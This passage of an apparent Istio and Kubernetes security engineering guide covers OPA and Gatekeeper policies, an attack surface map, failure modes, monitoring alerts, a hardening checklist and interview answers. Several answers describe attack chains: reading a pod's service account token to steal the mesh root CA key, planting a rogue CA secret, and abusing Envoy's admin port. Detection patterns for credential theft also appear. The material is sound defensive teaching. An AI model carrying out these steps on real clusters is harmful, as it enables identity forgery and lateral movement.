          "@type": type.googleapis.com/envoy.extensions.filters.http.ext_authz.v3.ExtAuthz
          grpc_service:
            envoy_grpc:
              cluster_name: outbound|9191||opa.opa.svc.cluster.local
          failure_mode_allow: false  # FAIL CLOSED: if OPA is unreachable, deny
```

OPA Rego policy example:
```rego
# opa-policy.rego
package istio.authz

default allow = false

allow {
    # Only allow payment amounts < $10,000 from untrusted sources
    input.parsed_body.amount < 10000
    input.attributes.source.principal == "cluster.local/ns/default/sa/frontend"
}

allow {
    # Trusted internal services can exceed the limit
    input.attributes.source.principal == "cluster.local/ns/internal/sa/admin-service"
}
```

### Admission Controller Hardening

Admission controllers intercept Kubernetes API requests before they're persisted in etcd:

```yaml
# OPA/Gatekeeper ConstraintTemplate: prevent privileged containers
apiVersion: templates.gatekeeper.sh/v1beta1
kind: ConstraintTemplate
metadata:
  name: k8snoprivilege
spec:
  crd:
    spec:
      names:
        kind: K8sNoPrivilege
  targets:
  - target: admission.k8s.gatekeeper.sh
    rego: |
      package k8snoprivilege
      violation[{"msg": msg}] {
        c := input.review.object.spec.containers[_]
        c.securityContext.privileged == true
        msg := sprintf("Container %v must not run as privileged", [c.name])
      }
---
# Constraint that enforces the template:
apiVersion: constraints.gatekeeper.sh/v1beta1
kind: K8sNoPrivilege
metadata:
  name: no-privileged-containers
spec:
  match:
    kinds:
    - apiGroups: [""]
      kinds: ["Pod"]
    excludedNamespaces: ["kube-system"]  # careful with this exclusion
```

**What admission controllers must enforce for mesh security:**

```
Required Admission Policies:
  1. No privileged containers (prevents iptables bypass)
  2. No hostNetwork: true (prevents bypassing pod network namespace)
  3. No hostPID: true (prevents inspecting other processes)
  4. No mounting /proc or /sys from host
  5. Require securityContext.readOnlyRootFilesystem: true
  6. Require non-root UID (runAsNonRoot: true)
  7. No automountServiceAccountToken: true without explicit opt-in
  8. Require resource limits (CPU/memory) — prevents noisy neighbor
  9. Require sidecar injection (reject pods without istio-proxy annotation)
  10. Block ServiceEntry resources pointing to metadata IPs (169.254.0.0/16)
```

---

## 7. Attack Surface Mapping

```
╔══════════════════════════════════════════════════════════════════════════════════╗
║              SERVICE MESH ATTACK SURFACE MAP                                    ║
╠══════════════════════════════════════════════════════════════════════════════════╣
║                                                                                  ║
║  EXTERNAL ATTACK SURFACE                                                         ║
║  ┌──────────────────────────────────────────────────────────────────────────┐  ║
║  │  Ingress Gateway (Internet-facing)                                        │  ║
║  │  Port: 80/443 (NodePort or LoadBalancer)                                 │  ║
║  │  Attacks: TLS downgrade, cert spoofing, HTTP smuggling                   │  ║
║  │  Defense: TLS 1.3 only, HSTS, WAF in front                              │  ║
║  │                                                                           │  ║
║  │  DNS (External)                                                           │  ║
║  │  Attacks: DNS hijacking → wrong cert presented                           │  ║
║  │  Defense: DNSSEC, cert pinning, CT monitoring                           │  ║
║  └──────────────────────────────────────────────────────────────────────────┘  ║
║                                                                                  ║
╠══════════════════════════════════════════════════════════════════════════════════╣
║  TRUST BOUNDARY 1: Internet → Ingress Gateway (TLS termination)                 ║
╠══════════════════════════════════════════════════════════════════════════════════╣
║                                                                                  ║
║  MESH-INTERNAL ATTACK SURFACE                                                    ║
║  ┌──────────────────────────────────────────────────────────────────────────┐  ║
║  │  Sidecar Proxy (per pod)                                                  │  ║
║  │  Port 15000: Admin (localhost) — if app escapes, can dump Envoy config  │  ║
║  │  Port 15001: Outbound (redirected)                                       │  ║
║  │  Port 15006: Inbound (redirected)                                        │  ║
║  │  Port 15010: Istiod gRPC (plaintext, internal only)                     │  ║
║  │  Port 15012: Istiod gRPC (TLS, for cert issuance)                       │  ║
║  │  Port 15020: Prometheus metrics (should be restricted)                   │  ║
║  │  Port 15090: Envoy metrics (Prometheus format)                          │  ║
║  │                                                                           │  ║
║  │  Attack: App container reads Envoy admin → sees all xDS config,         │  ║
║  │  routing tables, upstream TLS settings. No credentials but architecture  │  ║
║  │  exposed.                                                                │  ║
║  └──────────────────────────────────────────────────────────────────────────┘  ║
║                                                                                  ║
║  ┌──────────────────────────────────────────────────────────────────────────┐  ║
║  │  Istiod Control Plane                                                     │  ║
║  │  Port 15010: xDS plaintext (NEVER expose outside cluster)               │  ║
║  │  Port 15012: xDS + cert issuance (mTLS)                                 │  ║
║  │  Port 15014: Control plane metrics                                       │  ║
║  │  Port 443:   Webhook (sidecar injection, CRD validation)                │  ║
║  │                                                                           │  ║
║  │  Highest-value target: contains root CA private key                     │  ║
║  │  If compromised: all mesh mTLS can be forged                            │  ║
║  └──────────────────────────────────────────────────────────────────────────┘  ║
║                                                                                  ║
╠══════════════════════════════════════════════════════════════════════════════════╣
║  TRUST BOUNDARY 2: Pod → Istiod (mTLS, authenticated by Kubernetes SA JWT)     ║
╠══════════════════════════════════════════════════════════════════════════════════╣
║                                                                                  ║
║  KUBERNETES CONTROL PLANE ATTACK SURFACE                                         ║
║  ┌──────────────────────────────────────────────────────────────────────────┐  ║
║  │  API Server (port 6443)                                                   │  ║
║  │  - Audit logs: must be enabled and shipped to immutable SIEM            │  ║
║  │  - Admission webhooks: mutation/validation (Istiod, Gatekeeper)         │  ║
║  │  - etcd (port 2379-2380): holds ALL cluster state including secrets     │  ║
║  │    → Encrypt etcd at rest (KMS provider)                               │  ║
║  │    → Restrict etcd access to API server only (network policy)           │  ║
║  │                                                                           │  ║
║  │  Kubelet (port 10250)                                                    │  ║
║  │  - exec, logs, port-forward APIs                                        │  ║
║  │  - Must require client cert auth (--anonymous-auth=false)               │  ║
║  │  - Limit: NodeAuthorizer mode (nodes can only read their own data)      │  ║
║  └──────────────────────────────────────────────────────────────────────────┘  ║
║                                                                                  ║
╠══════════════════════════════════════════════════════════════════════════════════╣
║  TRUST BOUNDARY 3: Node → Kubernetes API (mTLS with kubelet client cert)        ║
╠══════════════════════════════════════════════════════════════════════════════════╣
║                                                                                  ║
║  SUPPLY CHAIN ATTACK SURFACE                                                      ║
║  ┌──────────────────────────────────────────────────────────────────────────┐  ║
║  │  Container Registry (Docker Hub, ECR, GCR)                              │  ║
║  │  - Poisoned base image → backdoored sidecar/app                        │  ║
║  │  - Defense: Image signing (Sigstore/Cosign), admission verification     │  ║
║  │                                                                           │  ║
║  │  Helm Charts / Kustomize / Terraform                                     │  ║
║  │  - Malicious chart deploys overpermissive RBAC                         │  ║
║  │  - Defense: Chart signing, policy-as-code review in CI                 │  ║
║  │                                                                           │  ║
║  │  Istio CRDs (VirtualService, AuthorizationPolicy, ServiceEntry)        │  ║
║  │  - Applied via GitOps pipeline                                          │  ║
║  │  - A compromised CI system can apply malicious routing rules           │  ║
║  │  - Defense: OPA admission policies, signed commits, manual review      │  ║
║  └──────────────────────────────────────────────────────────────────────────┘  ║
╚══════════════════════════════════════════════════════════════════════════════════╝
```

---

## 8. Failure Modes & Edge Cases

### Split-Brain: Istiod Unavailable During Certificate Rotation

```
Scenario: Istiod pods crash during a rolling deployment.
          All sidecar Envoys can no longer reach the CA for cert renewal.

Timeline:
  T=0:    Istiod pods crash (all replicas die simultaneously — bad rollout)
  T=0-12h: All existing certs are still valid (issued within last 24h)
           Traffic continues normally. No impact.
  T=12h:  Certs begin expiring (those issued 24h ago expire now)
          Envoys cannot renew — istiod is down
          mTLS handshakes BEGIN FAILING for expired certs

Behavior at T=12h+:
  - Connections between services start failing with TLS errors
  - "certificate has expired" errors in logs
  - Services appear healthy (internal health checks use localhost)
  - External traffic: fails because sidecar TLS expired
  
This is a FAIL CLOSED behavior — which is correct for security.
The alternative (fail open) would allow traffic but break mTLS guarantees.

Recovery:
  - Bring istiod back online
  - Envoys detect istiod is back (health check on xDS stream)
  - Mass cert renewal requests hit istiod simultaneously
  - istiod must handle "thundering herd" of renewal requests
  - Rate limiting on istiod CSR endpoint prevents self-DDoS
  - Stagger: Envoys add jitter to their renewal requests (built-in behavior)

Mitigation for prevention:
  - istiod: minimum 3 replicas, PodDisruptionBudget (maxUnavailable: 0)
  - istiod: anti-affinity rules (spread across nodes)
  - Cert lifetime: longer (48h) + rotate at 24h gives 24h buffer
  - Circuit breaker: Envoy continues with expired cert for configurable grace period
    (NOT recommended for production — security regression)
```

### Envoy xDS Push Overload (Config Fan-out)

```
Scenario: 1,000-pod cluster, operator applies a VirtualService change.
          Istiod must push xDS updates to 1,000 Envoys simultaneously.

Problem:
  - Each Envoy has an open gRPC stream to istiod
  - All 1,000 streams receive the same VirtualService update
  - Istiod CPU spikes from serializing the same Envoy config 1,000 times
  - Memory: 1,000 simultaneous open gRPC streams

Istiod behavior:
  - Debounce: aggregate multiple CRD changes into one push (100ms window)
  - Fan-out: push to all Envoys from a worker pool
  - Backpressure: if Envoy's ACK is slow, istiod queues up to N pending pushes
  - If queue full: istiod drops old pushes (newer config takes precedence)

Impact:
  - Envoys temporarily have stale config (gap between push and ACK)
  - Routing inconsistency: some pods using old config, others new
  - For VirtualService with canary routing: traffic split may be incorrect
    during the push window (~1-5 seconds for 1,000 pods)

Mitigation:
  - istiod high availability: 3+ replicas, sharded by namespace/cluster
  - Envoy xDS: use delta-xDS (send only changes, not full config)
    Reduces payload size by 10-100x for large clusters
  - istiod memory limit: tuned based on cluster size (50MB base + 1MB/pod)
```

### False Positives in AuthorizationPolicy

```
Scenario: AuthorizationPolicy blocks legitimate traffic during incident response.

Common cause: Security team adds blanket deny rule during incident:
  apiVersion: security.istio.io/v1beta1
  kind: AuthorizationPolicy
  metadata:
    name: emergency-lockdown
    namespace: default
  spec: {}  # Empty spec = DENY ALL

This immediately drops ALL traffic in the namespace.
Including: health checks, monitoring, metrics collection.

Cascade:
  1. All pods in 'default' fail readiness checks (health check blocked)
  2. Kubernetes removes pods from Service endpoints
  3. Ingress returns 503 to all external traffic
  4. Monitoring stops (Prometheus can't scrape)
  5. Incident becomes harder to investigate (no metrics/logs flowing)
  6. Operators panic, undo the policy
  7. Recovery: 1-2 minutes, but SLA broken

Correct approach for emergency lockdown:
  - Apply selective deny (specific source or specific operation, not global)
  - Exclude health check paths explicitly
  - Exclude monitoring namespace access
  - Apply to specific suspect workloads, not entire namespace
  
Recovery time consideration:
  AuthorizationPolicy change: propagates to all Envoys in ~500ms (small cluster)
  to ~5s (large cluster). If you apply wrong policy, recovery is fast.
```

---

## 9. Mitigations & Observability

### IaC Security Rules (Terraform + OPA)

**Terraform: Enforce mTLS STRICT mode:**

```hcl
# terraform/modules/istio-security/main.tf
resource "kubernetes_manifest" "peer_authentication_strict" {
  manifest = {
    apiVersion = "security.istio.io/v1beta1"
    kind       = "PeerAuthentication"
    metadata = {
      name      = "default"
      namespace = var.namespace
    }
    spec = {
      mtls = {
        mode = "STRICT"  # Never PERMISSIVE in production
      }
    }
  }
}

# Enforce with Sentinel policy:
import "tfplan/v2" as tfplan

peer_auth_resources = tfplan.find_resources("kubernetes_manifest")

deny["PeerAuthentication must use STRICT mode"] {
  resource := peer_auth_resources[_]
  resource.change.after.manifest.spec.mtls.mode != "STRICT"
}
```

**OPA Gatekeeper: Block ALLOW_ANY outbound traffic policy:**

```rego
package istio.mesh.security

# Deny if MeshConfig allows any outbound traffic
violation[{"msg": msg}] {
  input.review.kind.kind == "ConfigMap"
  input.review.object.metadata.name == "istio"
  input.review.object.metadata.namespace == "istio-system"
  mesh_config := json.unmarshal(input.review.object.data.mesh)
  mesh_config.outboundTrafficPolicy.mode != "REGISTRY_ONLY"
  msg := "Mesh outbound traffic policy must be REGISTRY_ONLY"
}
```

### Critical Metrics to Monitor

```
SECURITY METRICS:

1. mTLS enforcement metrics:
   # Prometheus query:
   istio_requests_total{
     connection_security_policy="none",
     reporter="destination"
   }
   # Alert if non-zero (plaintext requests reaching sidecar destinations)
   # Source: Envoy telemetry, emitted per-request

2. Certificate expiry:
   # Envoy metric:
   envoy_cluster_ssl_certs_number_expired{} > 0
   # Alert: immediately (expired cert = broken mTLS)
   
   # Certificate age:
   (time() - envoy_cluster_ssl_certificate_valid_from) / 
   (envoy_cluster_ssl_certificate_valid_to - envoy_cluster_ssl_certificate_valid_from) > 0.8
   # Alert if cert is >80% through its lifetime without renewal

3. Authorization denial rate:
   istio_requests_total{response_code="403"} / istio_requests_total
   # Spike in 403s: possible attack or misconfiguration
   # Label: source_workload, destination_workload, source_namespace

4. xDS push latency:
   pilot_xds_push_time_bucket{type="cds"}
   # Alert if p95 > 5s (large cluster config propagation)

5. Istiod errors:
   pilot_xds_push_errors_total
   pilot_k8s_cfg_events{type="warning"}
   # Alert if non-zero (config errors affecting data plane)

AUDIT LOG MONITORING (Kubernetes API server audit logs):

Events to alert on:
  - verb=create/update/delete, resource=secrets, namespace=istio-system
    → Potential CA key manipulation
  
  - verb=create, resource=serviceaccounts, combined with
    verb=create, resource=clusterrolebindings, user=system:serviceaccount:*
    → Privilege escalation: service account + binding created together
  
  - verb=exec, resource=pods, namespace=istio-system
    → Someone exec-ing into istiod pods (break-glass or attack)
  
  - verb=create/update, resource=authorizationpolicies
    → Policy changes: must be reviewed, should come from GitOps pipeline only
  
  - verb=create, resource=serviceentries, spec.endpoints[].address=169.254.*
    → Metadata service exposure via Istio ServiceEntry

NETWORK ANOMALY DETECTION:

  Unexpected egress destinations:
    # Cilium/Hubble query:
    destination.namespace NOT IN known_namespaces AND
    traffic.direction = "EGRESS"
  
  New service-to-service connection (never seen before):
    # Baseline: build graph of service communications over 7 days
    # Alert: edge in graph not seen in baseline
    # Source: Istio telemetry (source_workload → destination_workload)
  
  High error rate from a specific source:
    sum(rate(istio_requests_total{reporter="destination",
            response_code=~"5.."}[5m])) by (source_workload) > 10/s
```

### Concrete Hardening Checklist

```
CRITICAL (must do before production):
  [ ] PeerAuthentication: STRICT mode in all namespaces
  [ ] outboundTrafficPolicy: REGISTRY_ONLY in MeshConfig
  [ ] Default deny AuthorizationPolicy in every namespace
  [ ] automountServiceAccountToken: false on all pods (opt-in manually)
  [ ] istiod: 3+ replicas with PodDisruptionBudget
  [ ] etcd: encrypted at rest with KMS provider
  [ ] API server: audit logging enabled, shipped to immutable SIEM
  [ ] Kubelet: --anonymous-auth=false, --authorization-mode=Webhook
  [ ] Network policy: default deny in all namespaces
  [ ] Image signing: Cosign/Sigstore, admission webhook verifies signatures
  [ ] Admission controller: OPA Gatekeeper with security constraints

HIGH PRIORITY:
  [ ] Istiod: external CA (Vault PKI or AWS ACM PCA) instead of in-cluster
  [ ] Cert lifetime: reduce to 8h (rotate at 4h) for high-security workloads
  [ ] Envoy admin: restrict to localhost, add auth for metrics endpoints
  [ ] RBAC: audit and minimize — no ClusterAdmin for workloads
  [ ] Node isolation: istiod on dedicated nodes with taints/tolerations
  [ ] Secret encryption: use sealed secrets or external secrets operator

MONITORING:
  [ ] Alert on plaintext (non-mTLS) connections in STRICT mesh
  [ ] Alert on cert expiry approaching
  [ ] Alert on AuthorizationPolicy changes (only GitOps pipeline should do this)
  [ ] Alert on service account creation + RBAC binding within 60s (priv esc pattern)
  [ ] Anomaly detection on service-to-service communication graph
```

---

## 10. Interview Questions

### Q1: Explain exactly how iptables rules enable transparent mTLS proxying without the application knowing. What happens if an application bypasses iptables?

**Why asked:** Tests understanding of the fundamental interception mechanism.

**Answer direction:**

The init container installs iptables rules in the pod's Linux network namespace using the `nat` table. The key rules:
- `OUTPUT` chain: all TCP traffic from any UID except 1337 (Envoy's UID) is redirected to port 15001 (outbound Envoy listener).
- `PREROUTING` chain: all inbound TCP except from ports 15090, 15020, 15021 is redirected to port 15006 (inbound Envoy listener).

Envoy then uses `SO_ORIGINAL_DST` socket option to retrieve the original destination from the REDIRECT rule, so it knows where the application intended to connect.

**If an application bypasses iptables:** There are two methods. First, if the application uses `CAP_NET_ADMIN` to modify iptables rules directly (requires that capability, which should be denied by PodSecurityPolicy/PSS). Second, if the application uses raw sockets (`CAP_NET_RAW`) to bypass the TCP stack entirely — also requires an elevated capability. Third: if running as the same UID as Envoy (1337), traffic bypasses the redirect rule. This is why Envoy runs as a non-root UID and pods must not allow containers to run as UID 1337.

In Linkerd's alternative approach, they use a Rust-based proxy with the same iptables mechanism but also support eBPF-based interception (Linkerd 2.x with eBPF), which hooks at the TC (Traffic Control) layer in the kernel — harder to bypass from userspace.

---

### Q2: A service has `PeerAuthentication` in STRICT mode and an `AuthorizationPolicy` that allows traffic from service A. How exactly does Envoy enforce this, step by step, when a connection arrives?

**Why asked:** Tests detailed understanding of how the two resources interact in Envoy's filter chain.

**Answer direction:**

When a TCP connection arrives at the sidecar's port 15006:

1. **TLS Inspector filter** peeks at the first bytes. If not a TLS ClientHello → reject immediately (STRICT mode).
2. **TLS handshake:** Envoy (as server) presents its SPIFFE cert. Requires client to present a cert too (mTLS). If client presents no cert → TLS handshake fails with `certificate_required` alert.
3. **Client cert verification:** Envoy verifies the client cert is signed by the trusted CA (Istio root CA, distributed via xDS). If not → handshake fails.
4. **Principal extraction:** Envoy extracts the SPIFFE URI from the client cert's SAN field. This becomes the `source.principal`.
5. **RBAC filter** (AuthorizationPolicy enforcement): Evaluates the policy. Is `source.principal == "cluster.local/ns/default/sa/service-a"`? If yes → allow (request forwarded to local app port). If no → 403 returned.

The critical point: step 4 only works because step 2-3 succeeded. Without mTLS, there's no client cert, no SPIFFE ID, no principal. The RBAC filter receives an empty principal, which only matches rules with `source.principal: "*"` or no source constraint.

---

### Q3: The Kubernetes default is to automount service account tokens into every pod. Explain the complete attack chain from a compromised pod to mesh-wide mTLS bypass, and what exact configuration prevents it.

**Why asked:** Tests ability to trace a complete multi-step attack and know the precise fixes.

**Answer direction:**

Attack chain:
1. Pod compromise via app vulnerability (RCE).
2. Attacker reads `/var/run/secrets/kubernetes.io/serviceaccount/token` — the JWT.
3. JWT is used to call the Kubernetes API server at `kubernetes.default.svc.cluster.local:443`.
4. If the pod's service account has overpermissive RBAC (e.g., a monitoring tool with `list/get secrets` across namespaces), attacker reads the `cacerts` secret in `istio-system`.
5. `cacerts` contains the Istio root CA private key.
6. Attacker can now generate arbitrary SPIFFE X.509 certificates for any identity in the mesh.
7. All AuthorizationPolicies are defeated — the attacker can forge any service's identity.

**Fixes:**

```yaml
# 1. Disable automounting (globally):
apiVersion: v1
kind: ServiceAccount
metadata:
  name: payment-api
automountServiceAccountToken: false

# 2. If API access needed: use projected tokens with short expiry and audience restriction:
volumes:
- name: token
  projected:
    sources:
    - serviceAccountToken:
        audience: payment-api-specific-audience  # Not "kubernetes"
        expirationSeconds: 3600  # 1 hour instead of default very long
        path: token

# 3. Move Istio root CA to external HSM (Vault PKI):
# Now even if someone reads the Kubernetes secret, it's just a reference,
# not the actual private key.

# 4. Restrict RBAC: monitoring service accounts must NOT have secrets access:
# Prometheus only needs to scrape metrics endpoints, not read secrets.
```

---

### Q4: Explain xDS and why a bug in the xDS implementation could be a critical security vulnerability. What's the blast radius of istiod pushing a malicious config to Envoys?

**Why asked:** Tests understanding of the control plane as an attack vector.

**Answer direction:**

xDS is a family of gRPC APIs (LDS, CDS, RDS, EDS) that Istiod uses to push configuration to all Envoy proxies in the mesh. Envoy maintains open gRPC streams to istiod and receives streaming config updates. The trust relationship: Envoy trusts everything istiod sends.

A bug in xDS could allow:
1. **Config injection:** If an attacker can write to the Kubernetes API (via a compromised CI/CD pipeline), they can create CRDs that Istiod translates into malicious Envoy config. For example: a VirtualService that routes traffic to an attacker-controlled endpoint, capturing all plaintext traffic between services (after Envoy terminates mTLS).

2. **Routing hijack:** A malicious DestinationRule with a `trafficPolicy.tls.mode: DISABLE` would cause Envoy to send plaintext to a service even in STRICT mTLS mode (the sending Envoy's TLS setting vs the receiving sidecar's TLS verification are separate concerns).

3. **Certificate config override:** A malicious EnvoyFilter CRD could modify the TLS configuration to trust an attacker-controlled CA.

**Blast radius of istiod pushing malicious config:**
- All Envoys in all namespaces (istiod typically manages the whole cluster).
- Config propagates in 500ms-5s to all pods.
- Every mTLS connection, every routing decision is affected.
- The attack is invisible — traffic still flows, no errors, but all traffic is being routed or inspected by the attacker.

**Defense:** RBAC on CRD resources (only mesh-admin ClusterRole can modify `virtualservices`, `authorizationpolicies`), GitOps pipeline with mandatory code review for mesh config, admission webhooks that validate all CRDs against a security policy.

---

### Q5: What is the "confused deputy" problem in the context of the Istio control plane's Kubernetes RBAC permissions? Give a concrete example.

**Why asked:** Tests security reasoning about privilege delegation.

**Answer direction:**

Istiod needs broad Kubernetes permissions to do its job (watch services, endpoints, configmaps, secrets across all namespaces). This makes istiod a "deputy" — an entity with high privileges that acts on behalf of lower-privileged entities.

**The confused deputy attack:** A malicious service (or a developer with limited privileges) can create a Kubernetes `Secret` in their own namespace with a specific name. Istiod, which has `list/watch secrets` across all namespaces, reads this secret. If istiod blindly trusts secret content as configuration (for example, custom CA certificates per-namespace, a feature that existed in some configurations), the attacker's namespace can supply a malicious CA certificate that istiod distributes to Envoys in that namespace.

Now: Envoys in the attacker's namespace trust the attacker's CA. The attacker generates certs signed by their CA, presents them, and Envoys in that namespace accept them as legitimate mesh identities.

**Concrete example with namespace CA override:**

```yaml
# Attacker creates in their namespace:
apiVersion: v1
kind: Secret
metadata:
  name: cacerts
  namespace: attacker-namespace
data:
  root-cert.pem: <attacker's CA cert>
  # istiod, if configured to use per-namespace CAs, reads this
  # and uses it as the CA for attacker-namespace
```

**Fix:** 
- Disable per-namespace CA override features unless explicitly needed.
- If needed: use a validation webhook that ensures `cacerts` secrets can only be created by privileged service accounts.
- Prefer a single root CA managed externally (Vault) — istiod doesn't need to read CA material from arbitrary namespace secrets.

---

### Q6: How does Linkerd's approach to mTLS differ from Istio's, and what are the security tradeoffs of each?

**Why asked:** Tests breadth of knowledge across multiple service mesh implementations.

**Answer direction:**

**Linkerd architecture:**
- **No Envoy:** Linkerd uses a Rust-based sidecar proxy (`linkerd2-proxy`) written specifically for the purpose. Much smaller attack surface (~20MB binary vs Envoy's ~300MB+).
- **Automatic mTLS, always on:** Linkerd doesn't have PERMISSIVE mode — all pod-to-pod traffic is mTLS by default from day one of installation. No opt-in, no `PeerAuthentication` CRDs to misconfigure.
- **Simpler config model:** Fewer CRD types, fewer ways to misconfigure. Authorization policies are simpler (Server + ServerAuthorization resources, no EnvoyFilter equivalent).
- **Identity:** Also uses SPIFFE/X.509, issued by the Linkerd identity component (equivalent to Istiod's CA).

**Security tradeoffs:**

| Aspect | Istio | Linkerd |
|---|---|---|
| Attack surface | Large (Envoy C++, xDS, EnvoyFilter) | Smaller (Rust proxy, simpler API) |
| Misconfiguration risk | High (many CRD types, complex interactions) | Lower (fewer knobs) |
| mTLS default | PERMISSIVE (must set STRICT explicitly) | Always-on (no choice) |
| Policy expressiveness | Very high (OPA integration, complex conditions) | Moderate (simpler rules) |
| Extensibility | High (WASM plugins, EnvoyFilters) | Lower (fewer extension points) |
| Memory safety | C++ (historical CVEs) | Rust (memory-safe by default) |

For high-security environments prioritizing simplicity and reduced configuration error: Linkerd. For environments needing complex routing, observability, and policy capabilities: Istio. In practice, Istio's PERMISSIVE-as-default is its most significant default security gap.

---

### Q7: A container in a pod shares the network namespace with the Envoy sidecar. If the app container is compromised, what can an attacker do with access to Envoy's admin port on localhost:15000?

**Why asked:** Tests understanding of what information and capabilities Envoy admin exposes.

**Answer direction:**

Envoy's admin API (`/` endpoint) exposes extensive information:

1. **`/config_dump`:** Complete Envoy configuration — all listeners, clusters, routes, TLS settings. Reveals:
   - All internal service endpoints (pod IPs, ports)
   - TLS configuration (cert paths, cipher suites)
   - Routing rules (VirtualService logic translated to Envoy routes)
   - All upstream clusters and their health status

2. **`/certs`:** Lists all certificates loaded by Envoy, including their expiry times and SANs. Reveals the SPIFFE identity of this workload and all its peers.

3. **`/stats`:** All Envoy metrics including per-upstream success rates, latency histograms. Reveals traffic patterns and service topology.

4. **`/clusters`:** Lists all upstream clusters with their endpoint health. Effectively a service discovery dump.

5. **Dangerous:** `/drain_listeners` and `/quitquitquit` — can take down the sidecar, potentially bypassing mTLS (if the orchestrator restarts the pod without the sidecar, or if the app falls back to direct connectivity).

**What this means:** A compromised app container gains significant intelligence about the internal mesh — service topology, endpoint IPs, routing configuration — even without network access beyond localhost. This is valuable for lateral movement planning.

**Defense:** 
- Block admin port access from the app container using a network policy within the pod (Linux network namespace sharing makes this tricky — requires UID-based iptables rules).
- Better: Run app container and Envoy sidecar in separate network namespaces (requires pod infrastructure changes — not standard Kubernetes behavior).
- Practical: Enable admin authentication (Envoy supports OAuth2 on the admin port, but rarely configured).
- Most practical: Accept this as a known risk, focus on preventing container compromise (smaller container images, non-root, read-only FS, seccomp profiles).

---

*Document Version: 1.0 | Last Updated: May 2026 | Classification: Internal Engineering*  
*Key References: Istio Security Architecture (istio.io/docs), CNCF SPIFFE/SPIRE Specification, NIST SP 800-204 Microservices Security, CIS Kubernetes Benchmark v1.8, Kubernetes Threat Matrix (Microsoft), OWASP Kubernetes Security Cheat Sheet.*